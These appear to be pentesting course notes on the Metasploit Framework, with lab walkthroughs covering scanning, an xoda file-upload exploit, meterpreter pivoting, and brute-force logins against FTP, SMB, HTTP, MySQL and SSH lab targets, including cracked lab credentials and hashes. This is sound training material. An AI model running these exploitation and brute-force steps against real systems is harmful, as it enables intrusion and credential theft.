# The Metasploit Framework (MSF)

> #### ⚡ Prerequisites
>
> * Basic familiarity with Linux & Windows
> * Basic familiarity with TCP & UDP protocols
>
> #### 📕 Learning Objectives
>
> * Understand, install, configure and use **Metasploit Framework**
> * Perform **info-gathering**, **enumeration**, **exploitation**, **post exploitation** with Metasploit
>
> #### 🔬 Training list - PentesterAcademy/INE Labs
>
> `subscription required`
>
> - [Metasploit Auxiliary modules](https://www.attackdefense.com/listingnoauth?labtype=metasploit&subtype=metasploit-auxiliary)
> - [MITRE ATT&CK Linux Discovery](https://attackdefense.com/listing?labtype=mitre&subtype=mitre-discovery)
> - [Metasploit Meterpreter](https://attackdefense.com/listing?labtype=metasploit&subtype=metasploit-meterpreter)
> - [Linux Vulnerable Servers Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=metasploit&subtype=metasploit-linux-exploitation)
> - [Linux Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=linux-security-exploitation&subtype=linux-security-exploitation-metasploit)
> - [Linux Post Modules - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=linux-security-post-exploitation&subtype=linux-security-post-exploitation-metasploit)
> - [Win Basic Exploitation - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=windows-exploitation&subtype=windows-exploitation-basics)
> - [Win Pentesting Basic Exploitation](https://attackdefense.com/listing?labtype=windows-exploitation&subtype=windows-exploitation-pentesting)
> - [Win Apps Exploits - Metasploit](https://www.attackdefense.com/listingnoauth?labtype=metasploit&subtype=metasploit-windows-apps-exploits)
> - [Win Post Exploitation - Metasploit](https://attackdefense.com/listing?labtype=windows-post-exploitation&subtype=windows-post-exploitation-metasploit)
> - [Win Maintaining Access](https://attackdefense.com/listing?labtype=windows-maintaining-access&subtype=windows-maintaining-access-basics)

## MSF Introduction

🗒️ The [**Metasploit Framework**](https://www.metasploit.com/) (**MSF**) is an open-source pentesting and exploit development platform, used to write, test and execute exploit code.

- Provides automation of the penetration testing life cycle (specially exploitation and post-exploitation)
- Used to develop and test exploits
- Has a world database and public tested exploits 
- It is modular, new modules can be added and integrated
- [Pre-installed in Kali Linux](https://www.kali.org/tools/metasploit-framework/)
- It is [open-source](https://github.com/rapid7/metasploit-framework)
- Founded by H.D. Moore in 2003 (developed in Perl), Written in Ruby in 2007, acquired by [Rapid7](https://www.rapid7.com/) in 2009, released as Metasploit v6.0 in 2020
- **Metasploit Framework** is the Community Edition
- Metasploit Pro & Express are Commercial versions

> 📌 Check the [Metasploit Unleashed – Free Ethical Hacking Course by OffSec](https://www.offsec.com/metasploit-unleashed/)

### Terminology

| Term              | Description                                                  |
| ----------------- | ------------------------------------------------------------ |
| **Interface**     | Methods of interacting with the Metasploit Framework (`msfconsole`, Metasploit cmd) |
| **Module**        | Pieces of code that perform a particular task (an exploit)   |
| **Vulnerability** | Exploitable flaw or weakness in a computer system or network |
| **Exploit**       | Code/Module used to take advantage of a vulnerability        |
| **Payload**       | Piece of code delivered to the target by an exploit (execute arbitrary commands or provide remote access) |
| **Listener**      | Utility that listens for an incoming connection from a target |

> 📌 **Exploit** is launched (takes advantage of the vulnerability) ➡️ **Payload** dropped (executes a reverse shell command) ➡️ Connects back to the **Listener**

### Interfaces

🗒️ **Metasploit Framework Console** (**[MSFconsole](https://www.offsec.com/metasploit-unleashed/msfconsole/)**) - an all in one interface that provides with access to all the functionality of the MSF.

![msfconsole](.gitbook/assets/image-20230409121754103.png)

🗒️ **Metasploit Framework Command Line Interface** (**[MSFcli](https://www.offsec.com/metasploit-unleashed/msfcli/)**) - a command line utility used to facilitate the creation of automation scripts that utilize Metasploit modules.

- Discontinued in 2015, MSFconsole can be used with the same functionality of *redirecting output from other tools into `msfcli` and vice versa.*

🗒️ **Metasploit Community Edition GUI** - a web based GUI front-end of the MSF.

🗒️ [**Armitage**](https://www.kali.org/tools/armitage/) - a free Java based GUI front-end cyber attack management tool for the MSF.

- Visualizes targets and simplifies network discovery
- Recommends exploits
- Exposes the advanced capabilities of the MSF

### [Architecture](https://www.offsec.com/metasploit-unleashed/metasploit-architecture/)

![Metasploit Framework Architecture - oreilly.com](.gitbook/assets/16c68136-bdbb-4846-be83-4e93822ee0de.png)

🗒️ A **module** is the piece of code that can be utilized and executed by the MSF.

The MSF **libraries** (Rex, Core, Base) allow to extend and initiate functionality, facilitating the execution of modules without having to write additional code.

### [Modules](https://www.offsec.com/metasploit-unleashed/modules-and-locations/)

| MSF Module    | Description                                                  |
| ------------- | ------------------------------------------------------------ |
| **Exploit**   | Used to take advantage of a vulnerability, usually paired with a payload |
| **Payload**   | Code delivered and remotely executed on the target *after successful exploitation* - **e.g.** a reverse shell that initiates a connection |
| **Encoder**   | Used to encode payloads in order to avoid Anti Virus detection - **e.g.** [shikata_ga_nai](https://www.mandiant.com/resources/blog/shikata-ga-nai-encoder-still-going-strong) encoding scheme |
| **NOPS**      | Keep the payload sizes consistent across exploit attempts and ensure the *stability of a payload* on the target system |
| **Auxiliary** | Is not paired with a payload, used to perform additional functionality - **e.g.** port scanners, fuzzers, sniffers, etc |

### [Payload Types](https://www.offsec.com/metasploit-unleashed/payloads/)

**Payloads** are created at runtime from various components. Depending on the target system and infrastructure, there are two types of payloads that can be used:

- **Non-Staged Payload** - sent to the target system as is, along with the exploit
- **Staged Payload** - sent to the target in two parts:
  - the **stager** (first part) establish a stable communication channel between the attacker and target. It contains a payload, the stage, that initiates a reverse connection back to the attacker
  - the **stage** (second part) is downloaded by the stager and executed
    - executes arbitrary commands on the target
    - provides a reverse shell or Meterpreter session

🗒️ The [**Meterpreter**](https://www.offsec.com/metasploit-unleashed/about-meterpreter/) is an advanced multi-functional payload executed by in memory DLL injection stagers on the target system.

- Communicates over the stager socket
- Provides an interactive command interpreter on the target system

### [File System](https://www.offsec.com/metasploit-unleashed/filesystem-and-libraries/)

```bash
ls /usr/share/metasploit-framework
```

![ls /usr/share/metasploit-framework](.gitbook/assets/image-20230409193231022.png)

- MSF filesystem is intuitive and organized by directories.
- Modules are stored under:
  - `/usr/share/metasploit-framework/modules/`
  - `~/.msf4/modules` - user specified modules

![](.gitbook/assets/image-20230409193537174.png)

![](.gitbook/assets/image-20230409194316207.png)

![](.gitbook/assets/image-20230409194335838.png)

****

### Pentesting with MSF

🗒️ [**PTES**](http://www.pentest-standard.org/index.php/Main_Page) (**P**enetration **T**esting **E**xecution **S**tandard) is a methodology that contains 7 main sections, defined by the standard as a comprehensive basis for penetration testing execution.

- can be adopted as a roadmap for Metasploit integration and understanding of the phases of a penetration test.

> The various phases involved in a typical pentest should be:
>
> 📌 **Pre-Engagement Interactions**
>
> ⬇️ 
>
> 📌 **Information Gathering**
>
> ⬇️
>
> 📌 **Enumeration**
>
> - Threat Modeling
> - Vulnerability Analysis
>
> ⬇️
>
> 📌 **Exploitation**
>
> ⬇️
>
> 📌 **Post Exploitation**
>
> - Privilege Escalation
> - Maintaining Persistent Access
> - Clearing Tracks
>
> ⬇️
>
> 📌 **Reporting**

|            Pentesting Phase             | MSF Implementation                     |
| :-------------------------------------: | -------------------------------------- |
| **Information Gathering & Enumeration** | Auxiliary Modules, `nmap` reports      |
|       **Vulnerability Scanning**        | Auxiliary Modules, `nessus` reports    |
|            **Exploitation**             | Exploit Modules & Payloads             |
|          **Post Exploitation**          | Meterpreter                            |
|        **Privilege Escalation**         | Post Exploitation Modules, Meterpreter |
|    **Maintaining Persistent Access**    | Post Exploitation Modules, Persistence |

![PTES - infopulse.com](.gitbook/assets/ptes-methodology-pic-1-infopulse.jpg)

## Metasploit Fundamentals

### [Database](https://www.offsec.com/metasploit-unleashed/using-databases/)

🗒️ The **Metasploit Framework Database** (**msfdb**) contains all the data used with MSF like assessments and scans data, etc.

- Uses PostgreSQL as the primary database - `postgresql` service must be running
- Facilitates the import and storage of scan results (from Nmap, Nessus, other tools)

### MSF Kali Configuration

- Use APT package manager on Kali Linux (or on Debian-based distros)

```bash
sudo apt update && sudo apt install metasploit-framework -y
```

- Enable `postgresql` at boot, start the service and initialize MSF database

```bash
sudo systemctl enable postgresql
sudo systemctl restart postgresql
sudo msfdb init
```

- Run **`msfconsole`** to start the Metasploit Framework Console

```bash
msfconsole
```

- Check the db connection is on in the `msfconsole`

```bash
db_status
```



> 📌 Check this article by StationX ➡️ [How to Use Metasploit in Kali Linux + Metasploitable3](https://www.stationx.net/how-to-use-metasploit-in-kali-linux/) which will cover:
>
> - Deploying a Kali Linux virtual machine with Metasploit pre-installed
> - Setting up a target in a virtual lab, Metasploitable3, with Vagrant
> - A sample walkthrough against a vulnerable MySQL Server
> - Frequently Asked Questions (FAQ)

### [MSFConsole](https://www.offsec.com/metasploit-unleashed/msfconsole/)

🗒️ The **Metasploit Framework Console** (**msfconsole**) is an all-in-one interface and centralized console that allows access to all of the MSF options and features.

- It is launched by running the `msfconsole` command

```bash
msfconsole
```

- Run it in quiet mode without the banner with

```bash
msfconsole -q
```

### Module Variables

An MSF module requires additional information that can be configured through the use of MSF **variables**, both *local* or *global* variables, called **`options`** inside the msfconsole.

**Variables e.g.** (they are based on the selected module):

- `LHOST` - attacker's IP address
- `LPORT` - attacker's port number (receive reverse connection)
- `RHOST` - target's IP address
- `RHOSTS` - multiple targets/networks IP addresses
- `RPORT` - target port number

### Useful Commands

- Run `msfconsole` and check these useful commands:

```bash
help
version

show -h
show all
show exploits

search <STRING>
use <MODULE_NAME>
set <OPTION>
run
execute # same as run

sessions
connect
```

![](.gitbook/assets/image-20230412141325709.png)

![](.gitbook/assets/image-20230412141308687.png)

#### Port Scan Example

```bash
search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS <TARGET_IP>
set PORTS 1-1000
run
# CTRL+C to cancel the running process
back
```

![](.gitbook/assets/image-20230412175031929.png)

#### CVE Exploits Example

```bash
search cve:2017 type:exploit platform:window
```

![search cve:2017 type:exploit platform:window](.gitbook/assets/image-20230412175150747.png)

#### Payload Options Example

```bash
search eternalblue
use 0
# specify the identifier
set payload <PAYLOAD_NAME>
set RHOSTS <TARGET_IP>
run
# or
exploit
```

![](.gitbook/assets/image-20230412175427698.png)

![](.gitbook/assets/image-20230412175734432.png)

### [Workspaces](https://docs.rapid7.com/metasploit/managing-workspaces/)

🗒️ Metasploit **Workspaces** allows to manage and organize the hosts, data, scans and activities stored in the `msfdb`.

- Import, manipulate, export data
- Create, manage, switch between workspaces
- Sort and organize the assessments of the penetration test

> 📌 *It's recommended to create a new workspace for each engagement.*

```bash
msfconsole -q
db_status
	[*] Connected to msf. Connection type: postgresql.
```

```bash
workspace -h
```

![workspace -h](.gitbook/assets/image-20230412183240012.png)

```bash
workspace
# current working workspace
	* default
```

- **Create** a new workspace

```bash
workspace -a Test
```

![](.gitbook/assets/image-20230412183002282.png)

- **Change** workspace

```bash
workspace <WORKSPACE_NAME>
```

```bash
workspace -a INE
```

- **Delete** a workspace

```bash
workspace -d Test
```

## Information Gathering & Enumeration with MSF

- The Metasploit Framework allows to import `nmap` results.

### Nmap Enumeration

**`nmap`** enumeration results (*service versions, operating systems, etc*) can be exported into a file that can be imported into MSF and used for further detection and exploitation.

> 🔬 Check the full `nmap` information gathering lab in [this Nmap Host Discovery Lab](../assessment-methodologies/1-info-gathering.md#lab-with-nmap) (at the end of the page).

Some commands:

```bash
nmap <TARGET_IP>
nmap -Pn <TARGET_IP>
nmap -Pn -sV -O <TARGET_IP>
```

- Output the `nmap` scan results into an **`.XML`** format file that can be imported into MSF

```bash
nmap -Pn -sV -O 10.2.18.161 -oX windows_server_2012
```

### [MSFdb Import](https://www.offsec.com/metasploit-unleashed/using-databases/)

-  In the same lab environment from above, use `msfconsole` to import the results into MSF with the `db_import` command

```bash
service postgresql start
msfconsole
```

- Inside `msfconsole`

```bash
db_status
workspace -a Win2k12
```

```bash
db_import /root/windows_server_2012
```

```bash
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.7'
[*] Importing host 10.2.18.161
[*] Successfully imported /root/windows_server_2012
```

```bash
hosts
services
vulns
loot
creds
```

![](.gitbook/assets/image-20230412190333138.png)

- Perform an `nmap` scan *within the MSF Console and import the results in a dedicated workspace*

```bash
workspace -a nmap_MSF
```

```bash
db_nmap -Pn -sV -O <TARGET_IP>
```

![](.gitbook/assets/image-20230412190726940.png)

### [Port Scanning](https://www.offsec.com/metasploit-unleashed/port-scanning/)

MSF **Auxiliary modules** are used during the information gathering (similar to `nmap`) and the post exploitation phases of the pentest.

- perform TCP/UDP port scanning
- enumerate services
- discover hosts on different network subnets (post-exploitation phase)

#### Lab Network Service Scanning

> 🔬 Lab [T1046 : Network Service Scanning](https://attackdefense.com/challengedetails?cid=1869)

```bash
service postgresql start && msfconsole -q
```

```bash
workspace -a Port_scan
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.41.167.3
run
```

![](.gitbook/assets/image-20230412220747788.png)

```bash
curl 192.41.167.3
```

- Exploitation

```bash
search xoda
use exploit/unix/webapp/xoda_file_upload
set RHOSTS 192.41.167.3
set TARGETURI /
run
```

![](.gitbook/assets/image-20230412221111369.png)

- Perform a network scan on the second target

```bash
meterpreter > shell
```

```bash
/bin/bash -i
ifconfig
# 192.26.158.2 Local Lan subnet IP
exit
```

- Add the route within `meterpreter` and background the meterpreter session

```bash
run autoroute -s 192.26.158.2
background
```

![](.gitbook/assets/image-20230412221528898.png)

```bash
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.26.158.3
run
```

```bash
# the port scan will be performed through the first target system using the route
[+] 192.26.158.3: - 192.26.158.3:22 - TCP OPEN
[+] 192.26.158.3: - 192.26.158.3:21 - TCP OPEN
[+] 192.26.158.3: - 192.26.158.3:80 - TCP OPEN
```

- Upload and run `nmap` against the second target, from the first target machine

```bash
sessions 1
upload /root/tools/static-binaries/nmap /tmp/nmap
shell
```

```bash
/bin/bash -i
cd /tmp
chmod +x ./nmap
./nmap -p- 192.26.158.3
```

```bash
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

> 📌 There are **`3`** running services on the second target machine.

#### UDP Scan

- Into `msfconsole`

```bash
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 192.41.167.3
run
```

### [Services Enumeration](https://www.offsec.com/metasploit-unleashed/service-identification/)

> 📌🔬 Check the [Enumeration Section labs here](../assessment-methodologies/3-enumeration.md) for basic `nmap` enumeration.

Next, there are some MSF commands and modules for **service enumeration** on the same labs from the Enumeration Section.

- Auxiliary modules can be used for enumeration, brute-force attacks, etc

❗📝 **On every attacker machine, run this command to start `msfconsole`:**

```bash
service postgresql start && msfconsole -q
```

- Setup a **global variable**. This will set the RHOSTS option for all the modules utilized:

```bash
setg RHOSTS <TARGET_IP>
```

#### [FTP](../assessment-methodologies/3-enumeration/ftp-enum.md)

> **`auxiliary/scanner/ftp/ftp_version`**

```bash
ip -br -c a
workspace -a FTP_ENUM
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.146.175.3
run
```

```bash
[+] 192.146.175.3: - 192.146.175.3:21 - TCP OPEN
```

```bash
back
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.146.175.3
run
```

```bash
[+] 192.146.175.3:21 - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.146.175.3]\x0d\x0a'

search ProFTPD
```

> **`auxiliary/scanner/ftp/ftp_login`**

```bash
back
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_login
show options
set RHOSTS 192.146.175.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

```bash
[+] 192.146.175.3:21 - 192.146.175.3:21 - Login Successful: sysadmin:654321
```

> **`auxiliary/scanner/ftp/anonymous`**

```bash
back
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.146.175.3
run
```

#### [SMB/SAMBA](../assessment-methodologies/3-enumeration/smb-enum.md#lab-3)

> **`auxiliary/scanner/smb/smb_version`**

```bash
ip -br -c a
setg RHOSTS 192.132.155.3
workspace -a SMB_ENUM
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_version
options
run
```

```bash
[*] 192.132.155.3:445 - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)
```

> **`auxiliary/scanner/smb/smb_enumusers`**

```bash
back
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumusers
info
run
```

```bash
[+] 192.132.155.3:139 - SAMBA-RECON [ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )
```

> **`auxiliary/scanner/smb/smb_enumshares`**

```bash
back
search type:auxiliary name:smb
use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
run
```

```bash
[+] 192.132.155.3:139 - public - (DS) 
[+] 192.132.155.3:139 - john - (DS) 
[+] 192.132.155.3:139 - aisha - (DS) 
[+] 192.132.155.3:139 - emma - (DS) 
[+] 192.132.155.3:139 - everyone - (DS) 
[+] 192.132.155.3:139 - IPC$ - (I) IPC Service (samba.recon.lab)
```

> [**`auxiliary/scanner/smb/smb_login`**](https://www.offsec.com/metasploit-unleashed/smb-login-check/)

```bash
back
search smb_login
use auxiliary/scanner/smb/smb_login
options
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

```bash
[+] 192.132.155.3:445 - 192.132.155.3:445 - Success: '.\admin:password'
```

#### [HTTP](../assessment-methodologies/3-enumeration/http-enum.md#lab-3)

> 🔬 [Metasploit - Apache Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=118)

- Remember to specify the correct port and if targeting a web server with SSL enabled, in the options.

```bash
ip -br -c a
setg RHOSTS 192.106.226.3
setg RHOST 192.106.226.3
workspace -a HTTP_ENUM
```

> **`auxiliary/scanner/http/apache_userdir_enum`**

```bash
search apache_userdir_enum
use auxiliary/scanner/http/apache_userdir_enum
options
info
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

```bash
[+] http://192.106.226.3/ - Users found: rooty
```

> **`auxiliary/scanner/http/brute_dirs`**

> **`auxiliary/scanner/http/dir_scanner`**

```bash
search dir_scanner
use auxiliary/scanner/http/dir_scanner
options
run
```

> **`auxiliary/scanner/http/dir_listing`**

> **`auxiliary/scanner/http/http_put`**

```bash
[+] Found http://192.106.226.3:80/cgi-bin/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/data/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/doc/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/downloads/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/icons/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/manual/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/secure/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/users/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/uploads/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/web_app/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/view/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/webadmin/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/webmail/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/webdb/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/webdav/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/~admin/ 404 (192.106.226.3)
[+] Found http://192.106.226.3:80/~nobody/ 404 (192.106.226.3)
```

> **`auxiliary/scanner/http/files_dir`**

```bash
search files_dir
use auxiliary/scanner/http/files_dir
options
set DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap_files.txt
run
```

```bash
[+] Found http://192.106.226.3:80/file.backup 200
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[+] Found http://192.106.226.3:80/code.c 200
[*] Using code '404' as not found for files with extension .cfg
[+] Found http://192.106.226.3:80/code.cfg 200
[*] Using code '404' as not found for files with extension .class
[...]
[*] Using code '404' as not found for files with extension .html
[+] Found http://192.106.226.3:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[...]
[+] Found http://192.106.226.3:80/test.php 200
[*] Using code '404' as not found for files with extension .tar
[...]
```

> **`auxiliary/scanner/http/http_login`**

```bash
search http_login
use auxiliary/scanner/http/http_login
options
set AUTH_URI /secure/
unset USERPASS_FILE
echo "rooty" > user.txt
set USER_FILE /root/user.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

> **`auxiliary/scanner/http/http_header`**

```bash
search http_header
use auxiliary/scanner/http/http_header
options
run
```

```bash
[+] 192.106.226.3:80 : CONTENT-TYPE: text/html
[+] 192.106.226.3:80 : LAST-MODIFIED: Wed, 27 Feb 2019 04:21:01 GMT
[+] 192.106.226.3:80 : SERVER: Apache/2.4.18 (Ubuntu)
[+] 192.106.226.3:80 : detected 3 headers
```

> **`auxiliary/scanner/http/http_version`**

```bash
search type:auxiliary name:http
use auxiliary/scanner/http/http_version
options
run
# in case of HTTPS website, set RPORT=443 and SSL="true"
```

```bash
[+] 192.106.226.3:80 Apache/2.4.18 (Ubuntu)
```

> **`auxiliary/scanner/http/robots_txt`**

```bash
search robots_txt
use auxiliary/scanner/http/robots_txt
options
run
```

```bash
[+] Contents of Robots.txt:
# robots.txt for attackdefense 
User-agent: test                     
# Directories
Allow: /webmail
User-agent: *
# Directories
Disallow: /data
Disallow: /secure
```

```bash
curl http://192.106.226.3/data/
curl http://192.106.226.3/secure/
```

#### [MYSQL](../assessment-methodologies/3-enumeration/mysql-enum.md)

> 🔬 [Metasploit - MySQL Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=120)

```bash
ip -br -c a
setg RHOSTS 192.64.22.3
setg RHOST 192.64.22.3
workspace -a MYSQL_ENUM
```

> **`auxiliary/admin/mysql/mysql_enum`**

```bash
search mysql_enum
use auxiliary/admin/mysql/mysql_enum
info
set USERNAME root
set PASSWORD twinkle
run
```

```bash
[*] 192.64.22.3:3306 - Running MySQL Enumerator...
[*] 192.64.22.3:3306 - Enumerating Parameters
[*] 192.64.22.3:3306 -  MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.64.22.3:3306 -  Compiled for the following OS: debian-linux-gnu
[*] 192.64.22.3:3306 -  Architecture: x86_64
[*] 192.64.22.3:3306 -  Server Hostname: victim-1
[*] 192.64.22.3:3306 -  Data Directory: /var/lib/mysql/
[*] 192.64.22.3:3306 -  Logging of queries and logins: OFF
[*] 192.64.22.3:3306 -  Old Password Hashing Algorithm OFF
[*] 192.64.22.3:3306 -  Loading of local files: ON
[*] 192.64.22.3:3306 -  Deny logins with old Pre-4.1 Passwords: OFF
[*] 192.64.22.3:3306 -  Allow Use of symlinks for Database Files: YES
[*] 192.64.22.3:3306 -  Allow Table Merge: 
[*] 192.64.22.3:3306 -  SSL Connection: DISABLED
[*] 192.64.22.3:3306 - Enumerating Accounts:
[*] 192.64.22.3:3306 -  List of Accounts with Password Hashes:
[+] 192.64.22.3:3306 -          User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.64.22.3:3306 -          User: root Host: 891b50fafb0f Password Hash: 
[+] 192.64.22.3:3306 -          User: root Host: 127.0.0.1 Password Hash: 
[+] 192.64.22.3:3306 -          User: root Host: ::1 Password Hash: 
[+] 192.64.22.3:3306 -          User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.64.22.3:3306 -          User: root Host: % Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.64.22.3:3306 -          User: filetest Host: % Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.64.22.3:3306 -          User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.64.22.3:3306 -          User: guest Host: localhost Password Hash: *17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.64.22.3:3306 -          User: gopher Host: localhost Password Hash: *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.64.22.3:3306 -          User: backup Host: localhost Password Hash: *E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.64.22.3:3306 -          User: sysadmin Host: localhost Password Hash: *78A1258090DAA81738418E11B73EB494596DFDD3
[*] 192.64.22.3:3306 -  The following users have GRANT Privilege:
[...]
```

> **`auxiliary/admin/mysql/mysql_sql`**

```bash
search mysql_sql
use auxiliary/admin/mysql/mysql_sql
options
set USERNAME root
set PASSWORD twinkle
run
# set an SQL query
set SQL show databases;
run
```

```bash
[*] 192.64.22.3:3306 - Sending statement: 'select version()'...
[*] 192.64.22.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |

[*] 192.64.22.3:3306 - Sending statement: 'show databases;'...
[*] 192.64.22.3:3306 -  | information_schema |
[*] 192.64.22.3:3306 -  | mysql |
[*] 192.64.22.3:3306 -  | performance_schema |
[*] 192.64.22.3:3306 -  | upload |
[*] 192.64.22.3:3306 -  | vendors |
[*] 192.64.22.3:3306 -  | videos |
[*] 192.64.22.3:3306 -  | warehouse |
```

> **`auxiliary/scanner/mysql/mysql_file_enum`**

> **`auxiliary/scanner/mysql/mysql_hashdump`**

> **`auxiliary/scanner/mysql/mysql_login`**

```bash
search mysql_login
use auxiliary/scanner/mysql/mysql_login
options
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS false
run
```

```bash
[+] 192.64.22.3:3306 - 192.64.22.3:3306 - Success: 'root:twinkle'
```

> **`auxiliary/scanner/mysql/mysql_schemadump`**

```bash
search mysql_schemadump
use auxiliary/scanner/mysql/mysql_schemadump
options
set USERNAME root
set PASSWORD twinkle
run
```

```bash
[+] 192.64.22.3:3306 - Schema stored in:
/root/.msf4/loot/20230413112948_MYSQL_ENUM_192.64.22.3_mysql_schema_807923.txt
[+] 192.64.22.3:3306 - MySQL Server Schema
 Host: 192.64.22.3
 Port: 3306
 ====================
---
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
- DBName: warehouse
  Tables: []
```

> **`auxiliary/scanner/mysql/mysql_version`**

```bash
search type:auxiliary name:mysql
use auxiliary/scanner/mysql/mysql_version
options
run
```

```bash
[+] 192.64.22.3:3306 - 192.64.22.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
# MySQL and Ubuntu versions enumerated!
```

> **`auxiliary/scanner/mysql/mysql_writable_dirs`**

- Check the MySQL Enumerated data within MSF:

```bash
hosts
services
loot
creds
```

![](.gitbook/assets/image-20230413133324466.png)

#### [SSH](../assessment-methodologies/3-enumeration/ssh-enum.md)

> 🔬 [Metasploit - SSH Login](https://attackdefense.com/challengedetails?cid=1526)

```bash
ip -br -c a
setg RHOSTS 192.127.196.3
setg RHOST 192.127.196.3
workspace -a SSH_ENUM
```

> **`auxiliary/scanner/ssh/ssh_version`**

```bash
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_version
options
run
```

```bash
[+] 192.127.196.3:22 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:19.04 service.protocol=ssh fingerprint_db=ssh.banner )
# SSH-2.0-OpenSSH_7.9p1 and Ubuntu 19.04
```

> **`auxiliary/scanner/ssh/ssh_login`**

```bash
search ssh_login
use auxiliary/scanner/ssh/ssh_login
# for password authentication
options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run
```

```bash
[+] 192.127.196.3:22 - Success: 'sysadmin:hailey' ''
[*] Command shell session 1 opened (192.127.196.2:37093 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'rooty:pineapple' ''
[*] Command shell session 2 opened (192.127.196.2:44935 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'demo:butterfly1' ''
[*] Command shell session 3 opened (192.127.196.2:39681 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'auditor:xbox360' ''
[*] Command shell session 4 opened (192.127.196.2:42273 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'anon:741852963' ''
[*] Command shell session 5 opened (192.127.196.2:44263 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'administrator:password1' ''
[*] Command shell session 6 opened (192.127.196.2:39997 -> 192.127.196.3:22)
[+] 192.127.196.3:22 - Success: 'diag:secret' ''
```

- This module sets up SSH sessions

![](.gitbook/assets/image-20230413143027661.png)

> **`auxiliary/scanner/ssh/ssh_enumusers`**

```bash
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_enumusers
options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

```bash
[+] 192.127.196.3:22 - SSH - User 'sysadmin' found
[+] 192.127.196.3:22 - SSH - User 'rooty' found
[+] 192.127.196.3:22 - SSH - User 'demo' found
[+] 192.127.196.3:22 - SSH - User 'auditor' found
[+] 192.127.196.3:22 - SSH - User 'anon' found
[+] 192.127.196.3:22 - SSH - User 'administrator' found
[+] 192.127.196.3:22 - SSH - User 'diag' found
```

#### [SMTP](../assessment-methodologies/3-enumeration/smtp-enum.md)

